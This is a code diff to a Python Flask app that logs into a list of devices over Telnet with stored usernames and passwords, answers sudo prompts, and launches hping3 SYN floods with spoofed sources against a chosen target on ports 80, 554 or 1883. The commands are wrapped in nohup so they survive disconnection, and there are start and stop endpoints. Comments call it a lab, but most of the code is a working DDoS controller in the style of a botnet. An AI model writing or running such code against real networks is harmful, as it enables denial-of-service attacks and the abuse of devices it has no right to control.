@@ -146,21 +146,26 @@ class DatabaseManager:
             return attack_id
 
     def execute_telnet_login_and_send(self, ip, username, password, command):
-        """Establish Telnet connection, log in, and send the initial command (without newline). Returns the active Telnet object."""
+        """Establish Telnet connection, log in, and send the initial command (e.g., sudo hping3 ... &). Returns the active Telnet object."""
+        tn = None # Initialize tn to None
         try:
             logging.info(f"Attempting Telnet connection to {ip}:23")
-            tn = telnetlib.Telnet(ip, 23, timeout=10)
+            tn = telnetlib.Telnet(ip, 23, timeout=15) # Increased timeout for connection
             logging.info(f"Telnet connection to {ip} established.")
 
-            # Read until login prompt
+            # Read until login prompt (handle variations)
             login_prompt_response = tn.read_until(b"login: ", timeout=5)
-            logging.info(f"Read from {ip} (login prompt): {login_prompt_response}")
+            if b"login:" not in login_prompt_response:
+                 login_prompt_response = tn.read_until(b"Username: ", timeout=5)
+            logging.info(f"Read from {ip} (login prompt): {login_prompt_response.decode(errors='ignore')}")
             tn.write(username.encode() + b"\n")
             logging.info(f"Sent username {username} to {ip}")
 
-            # Read until password prompt
+            # Read until password prompt (handle variations)
             password_prompt_response = tn.read_until(b"Password: ", timeout=5)
-            logging.info(f"Read from {ip} (password prompt): {password_prompt_response}")
+            if b"Password:" not in password_prompt_response:
+                password_prompt_response = tn.read_until(b"password: ", timeout=5) # common variation
+            logging.info(f"Read from {ip} (password prompt): {password_prompt_response.decode(errors='ignore')}")
             if password:
                 tn.write(password.encode() + b"\n")
                 logging.info(f"Sent password to {ip}")
@@ -168,36 +173,138 @@ class DatabaseManager:
                 tn.write(b"\n")
                 logging.warning(f"No password provided for {ip}, sent empty line.")
 
-            # Wait for shell prompt or command completion indicator
-            shell_prompt_response = tn.read_until(b"$", timeout=5)
-            logging.info(f"Read from {ip} (shell prompt $): {shell_prompt_response}")
-            if b"$" not in shell_prompt_response:
-                 shell_prompt_response = tn.read_until(b"#", timeout=5)
-                 logging.info(f"Read from {ip} (shell prompt #): {shell_prompt_response}")
-            if b"#" not in shell_prompt_response and b"$" not in shell_prompt_response:
-                 shell_prompt_response = tn.read_until(b">", timeout=5)
-                 logging.info(f"Read from {ip} (shell prompt >): {shell_prompt_response}")
+            # Wait for shell prompt or command completion indicator (handle variations and capture output)
+            shell_prompt_patterns = [b"\r\n$", b"\n$", b"\r\n#", b"\n#", b"\r\n>", b"\n>"] # More robust prompt matching including newline
+            index, match, shell_prompt_response = tn.expect(shell_prompt_patterns, timeout=10) # Increased timeout for prompt
+            logging.info(f"Read from {ip} (shell prompt): {shell_prompt_response.decode(errors='ignore')}")
 
-            logging.info(f"Sending initial command to {ip} via Telnet (without newline): {command}")
-            tn.write(command.encode())
-            logging.info(f"Initial command written to {ip}")
+            if match:
+                logging.info(f"Shell prompt detected on {ip}.")
+                # Send the command with '&' for backgrounding and potential 'nohup'
+                # Adding nohup to ensure command runs after session disconnects unexpectedly
+                full_command = f"nohup {command} &"
+                logging.info(f"Sending command to {ip} via Telnet: {full_command}")
+                tn.write(full_command.encode() + b"\n") # Send command with newline
+                logging.info(f"Command written to {ip}")
 
-            # Return the active Telnet object
-            return tn
+                # Read for immediate output after sending command (may contain sudo prompt or errors)
+                # Use expect to look for password prompt or the next shell prompt
+                sudo_prompt_pattern = b"[sudo] password for " # More specific sudo prompt pattern
+                execution_patterns = [sudo_prompt_pattern] + shell_prompt_patterns
+                logging.info(f"Checking for sudo prompt or next shell prompt on {ip}...")
+                index, match, response_after_cmd = tn.expect(execution_patterns, timeout=5) # Shorter timeout for prompt after cmd
+                logging.info(f"Read from {ip} (after sending command): {response_after_cmd.decode(errors='ignore')}")
 
-        except Exception as e:
-            logging.error(f"Failed during Telnet login or initial command send on {ip}: {e}")
-            # Ensure connection is closed if an error occurs during setup
-            try:
-                if tn:
+                if match and match.group(0) == sudo_prompt_pattern:
+                    logging.info(f"Sudo password prompt detected on {ip} after sending command.")
+                    if password:
+                        tn.write((password + "\n").encode())
+                        logging.info(f"Sent sudo password to {ip} after command.")
+                        # Read until the next shell prompt after sending sudo password
+                        logging.info(f"Waiting for shell prompt after sudo password on {ip}...")
+                        index, match, response_after_sudo_password = tn.expect(shell_prompt_patterns, timeout=5)
+                        logging.info(f"Read from {ip} (after sudo password): {response_after_sudo_password.decode(errors='ignore')}")
+                        if match:
+                            logging.info(f"Shell prompt detected after sudo password on {ip}. Command likely executing.")
+                            return tn # Return session if prompt reached
+                        else:
+                            logging.error(f"Could not detect shell prompt after sending sudo password on {ip}. Command may not have executed.")
+                            tn.close()
+                            return None
+                    else:
+                        logging.warning(f"No password available for sudo on {ip} after command, command likely failed.")
+                        tn.close() # Close session as command likely failed
+                        return None
+                elif match: # Matched a shell prompt immediately after sending command (no sudo prompt)
+                     logging.info(f"Shell prompt detected immediately after sending command on {ip}. Command likely backgrounded.")
+                     return tn # Return session if prompt reached
+                else:
+                    logging.error(f"Could not detect sudo prompt or shell prompt after sending command on {ip}. Session may be unstable or command failed.")
                     tn.close()
-            except:
-                pass
+                    return None
+
+            else:
+                 logging.error(f"Could not detect initial shell prompt on {ip}. Cannot send command.")
+                 tn.close()
+                 return None
+
+        except EOFError:
+             logging.error(f"Telnet connection to {ip} closed unexpectedly (EOF).")
+             if tn:
+                  try:
+                       tn.close()
+                  except:
+                       pass
+             return None
+        except Exception as e:
+            logging.error(f"Failed during Telnet interaction with {ip}: {e}")
+            # Ensure connection is closed if an error occurs
+            if tn:
+                try:
+                    tn.close()
+                except:
+                    pass
             return None
+
+    def stop_telnet_session(self, ip, tn):
+        """Send stop signals and close the Telnet session."""
+        try:
+            logging.info(f"Attempting to stop hping3 and close session on {ip}.")
+
+            # Send Ctrl+C (Interrupt)
+            tn.write(b'\x03')
+            logging.info(f"Sent Ctrl+C to {ip}.")
+            time.sleep(1) # Give it a moment to interrupt
+
+            # Send pkill hping3 to be sure, and immediately send newline
+            # Note: Sending sudo pkill hping3 here will likely require password again.
+            # For simplicity in this lab, we send it but acknowledge it might fail without password.
+            pkill_cmd = b'sudo pkill hping3\n'
+            tn.write(pkill_cmd)
+            logging.info(f"Sent 'sudo pkill hping3' to {ip}.")
+            time.sleep(1) # Give it a moment to process
+
+            # Read any immediate output after pkill (might be password prompt or confirmation)
+            # Use expect to look for password prompt or the next shell prompt
+            sudo_prompt_pattern = b"[sudo] password for "
+            shell_prompt_patterns = [b"\r\n$", b"\n$", b"\r\n#", b"\n#", b"\r\n>", b"\n>"]
+            stop_response_patterns = [sudo_prompt_pattern] + shell_prompt_patterns
+            index, match, response_after_pkill = tn.expect(stop_response_patterns, timeout=3)
+            logging.info(f"Read from {ip} (after stop commands): {response_after_pkill.decode(errors='ignore')}")
+
+            if match and match.group(0) == sudo_prompt_pattern:
+                 logging.warning(f"Sudo password prompt detected for pkill on {ip}. pkill may fail without password.")
+                 # We are not handling sending password for pkill here.
+            elif match:
+                 logging.info(f"Shell prompt detected after stop commands on {ip}. Command likely stopped or finished.")
+            else:
+                 logging.warning(f"Could not detect prompt after stop commands on {ip}.")
+
+            # Attempt to read any final output before closing
+            final_output = tn.read_very_lazy()
+            if final_output:
+                 logging.info(f"Final lazy read output from {ip}: {final_output.decode(errors='ignore')}")
+
+            tn.close()
+            logging.info(f"Closed Telnet session for {ip}.")
+            return True
+
+        except EOFError:
+             logging.warning(f"Telnet connection to {ip} closed unexpectedly during stop (EOF).")
+             return False # Treat as not successfully stopped via commands
+        except Exception as e:
+            logging.error(f"Error stopping hping3 or closing session on {ip}: {e}")
+            # Attempt to force close the session on error
+            if tn:
+                 try:
+                     tn.close()
+                 except:
+                     pass
+            return False
 
 # Global variables
 db_manager = DatabaseManager()
-active_telnet_sessions = {} # Dictionary to hold active Telnet session objects
+active_telnet_sessions = {} # Dictionary to hold active Telnet session objects {ip: tn_object}
 current_attack = None
 attack_status = {
     'active': False,
@@ -662,7 +769,6 @@ def start_telnet_ddos():
         # Check if target_ip is None or an empty string explicitly
         if target_ip is None or target_ip == '':
             logging.warning("Start-telnet-ddos: Target IP required but not received (explicit check).")
-            # Return a more specific error message
             return jsonify({'error': 'Target IP missing or empty in request'}), 400
 
         logging.info("start-telnet-ddos: Target IP check passed.") # Log if the check is passed
@@ -680,67 +786,33 @@ def start_telnet_ddos():
 
         # Translate attack type to hping3 command template
         if attack_type == 'syn':
-            hping3_cmd_template = "sudo hping3 -S -p 80 --flood --rand-source {}".format(target_ip)
+            hping3_cmd_template = f"sudo hping3 -S -p 80 --flood --rand-source {target_ip}"
         elif attack_type == 'rtsp':
-             hping3_cmd_template = "sudo hping3 -S -p 554 --flood --rand-source {}".format(target_ip)
+             hping3_cmd_template = f"sudo hping3 -S -p 554 --flood --rand-source {target_ip}"
         elif attack_type == 'mqtt':
-             hping3_cmd_template = "sudo hping3 -S -p 1883 --flood --rand-source {}".format(target_ip)
+             hping3_cmd_template = f"sudo hping3 -S -p 1883 --flood --rand-source {target_ip}"
         else:
             return jsonify({'error': 'Invalid attack type'}), 400
 
+        # Clear any previous active sessions before starting new ones
+        active_telnet_sessions.clear()
+        logging.info("Cleared previous active Telnet sessions.")
+
         for device in devices:
             ip, username, password = device
-            # Construct the full hping3 command for this device (sent without newline initially)
+            # Construct the full hping3 command for this device
             hping3_cmd = hping3_cmd_template
 
-            try:
-                # Establish session, login, and send the command without newline
-                tn = db_manager.execute_telnet_login_and_send(ip, username, password, hping3_cmd)
+            # Attempt to establish session, login, and send the command
+            tn = db_manager.execute_telnet_login_and_send(ip, username, password, hping3_cmd)
 
-                if tn:
-                    logging.info(f"Checking for sudo password prompt on {ip} after sending command.")
-                    # Read for a short time to catch password prompt
-                    response_after_cmd = tn.read_very_eager()
-                    logging.info(f"Read from {ip} (after sending command): {response_after_cmd}")
-
-                    if b"password" in response_after_cmd.lower():
-                        logging.info(f"Sudo password prompt detected on {ip}.")
-                        if password:
-                            tn.write((password + "\n").encode())
-                            logging.info(f"Sent sudo password to {ip}.")
-                            # Read again after sending password
-                            response_after_password = tn.read_until(b"$" or b"#" or b">", timeout=5)
-                            logging.info(f"Read from {ip} (after sending password): {response_after_password}")
-                        else:
-                            logging.warning(f"No password available for sudo on {ip}, command may fail.")
-
-                    # Send newline to execute the command
-                    logging.info(f"Sending newline to execute command on {ip}.")
-                    tn.write(b"\n")
-
-                    # Give command a moment to start or show immediate errors
-                    time.sleep(2)
-                    immediate_output = tn.read_very_eager()
-                    if immediate_output:
-                        logging.info(f"Immediate output after execution on {ip}: {immediate_output.decode(errors='ignore')}")
-
-                    # Store the active Telnet session
-                    active_telnet_sessions[ip] = tn
-                    successful_sessions.append(ip)
-                    logging.info(f"Stored active Telnet session for {ip}.")
-                else:
-                    logging.error(f"Failed to establish Telnet session for {ip}.")
-
-            except Exception as e:
-                logging.error(f"Error during Telnet interaction with {ip}: {e}")
-                # Clean up the session if an error occurred during interaction
-                if ip in active_telnet_sessions and active_telnet_sessions[ip]:
-                    try:
-                        active_telnet_sessions[ip].close()
-                        del active_telnet_sessions[ip]
-                        logging.info(f"Closed Telnet session for {ip} due to error.")
-                    except:
-                        pass
+            if tn:
+                # Store the active Telnet session if successfully established and command sent
+                active_telnet_sessions[ip] = tn
+                successful_sessions.append(ip)
+                logging.info(f"Successfully started Telnet session for {ip} and sent command.")
+            else:
+                logging.error(f"Failed to establish Telnet session or send command for {ip}.")
 
         return jsonify({
             'status': 'success',
@@ -750,6 +822,14 @@ def start_telnet_ddos():
 
     except Exception as e:
         logging.error(f"Failed to initiate Telnet DDoS attack sessions: {e}")
+        # Attempt to close any sessions that might have been partially opened on error
+        for ip, tn in list(active_telnet_sessions.items()):
+             if tn:
+                  try:
+                       tn.close()
+                       del active_telnet_sessions[ip]
+                  except:
+                       pass
         return jsonify({'error': str(e)}), 500
 
 @app.route('/stop-telnet-ddos', methods=['POST'])
@@ -758,58 +838,27 @@ def stop_telnet_ddos():
     global active_telnet_sessions
     stopped_count = 0
     errors = {}
+    initial_session_count = len(active_telnet_sessions)
 
-    # Iterate through active sessions
-    ips_to_stop = list(active_telnet_sessions.keys()) # Create a list to iterate over while modifying the dict
+    # Iterate through active sessions and stop them
+    # Create a list of keys to iterate over as the dictionary will be modified
+    ips_to_stop = list(active_telnet_sessions.keys())
+    logging.info(f"Attempting to stop {len(ips_to_stop)} active Telnet DDoS sessions.")
+
     for ip in ips_to_stop:
         tn = active_telnet_sessions.get(ip)
         if tn:
-            try:
-                logging.info(f"Attempting to stop hping3 on {ip}.")
-                # Send Ctrl+C (Interrupt)
-                tn.write(b'\x03')
-                logging.info(f"Sent Ctrl+C to {ip}.")
-
-                # Send pkill hping3 to be sure
-                tn.write(b'sudo pkill hping3\n')
-                logging.info(f"Sent 'sudo pkill hping3' to {ip}.")
-
-                # Handle potential sudo password prompt for pkill
-                response_after_pkill = tn.read_very_eager() # Read anything immediately
-                if b"password" in response_after_pkill.lower():
-                     logging.info(f"Sudo password prompt detected for pkill on {ip}.")
-                     # Note: We don't have password easily available here. pkill might fail without it.
-                     # For this lab, assume password might be needed and log it.
-                     logging.warning(f"Sudo password needed for pkill on {ip}, command may fail.")
-
-                time.sleep(2) # Give commands time to process
-
-                # Read any final output
-                final_output = tn.read_very_lazy()
-                if final_output:
-                    logging.info(f"Output after stop commands on {ip}: {final_output.decode(errors='ignore')}")
-
-                tn.close()
-                del active_telnet_sessions[ip]
+            success = db_manager.stop_telnet_session(ip, tn)
+            if success:
                 stopped_count += 1
-                logging.info(f"Closed Telnet session for {ip}.")
+            else:
+                errors[ip] = f"Failed to stop session for {ip}"
 
-            except Exception as e:
-                logging.error(f"Error stopping hping3 on {ip}: {e}")
-                errors[ip] = str(e)
-                # Attempt to close the session even if stopping failed
-                try:
-                    if ip in active_telnet_sessions and active_telnet_sessions[ip]:
-                         active_telnet_sessions[ip].close()
-                         del active_telnet_sessions[ip]
-                         logging.info(f"Closed Telnet session for {ip} due to error during stop.")
-                except:
-                    pass
+            # Remove from active sessions regardless of stop success
+            if ip in active_telnet_sessions:
+                 del active_telnet_sessions[ip]
 
-    if stopped_count == 0 and not errors:
-        return jsonify({'message': 'No active Telnet DDoS sessions to stop.'})
-
-    response_message = f'Attempted to stop DDoS attack on {stopped_count}/{len(ips_to_stop)} devices.'
+    response_message = f'Attempted to stop DDoS attack on {stopped_count}/{initial_session_count} devices.'
     if errors:
         response_message += f' Errors on: {list(errors.keys())}'
 
